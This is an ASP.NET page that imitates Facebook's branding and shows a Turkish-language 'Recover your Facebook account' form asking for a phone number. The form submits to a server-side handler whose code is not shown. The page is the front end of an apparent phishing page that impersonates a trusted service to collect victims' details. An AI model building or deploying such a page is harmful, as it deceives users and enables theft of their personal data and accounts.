<%@ Page Language="C#" AutoEventWireup="true" CodeFile="Default.aspx.cs" Inherits="_Default" %>

<!DOCTYPE html>

<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto+Mono:700" rel="stylesheet">
</head>
<body style="background-color:lightgrey;">
    <form id="form1" runat="server">
    <div>
    <div style="width:100%;height:70px;color:white;letter-spacing:5px;background-color:#3b5998;font-size:30px;font-family: 'Roboto Mono', monospace;padding-top:0.4%;">facebook</div>
        <div style="width:80%;height:200px;margin-left:7%;margin-top:6%;background-color:white;padding:5%;"><h6 style="margin-left:5%;">Facebook Hesabını Kurtar.</h6>
            <asp:TextBox ID="tel" runat="server" type="text" class="form-control" placeHolder="Telefon no"></asp:TextBox><br />
            <asp:Button ID="kurtar" runat="server" Text="Kurtar" type="button" class="btn btn-primary" Width="100%" OnClick="kurtar_Click" />
        </div>
    </div>
    </form>
</body>
</html>
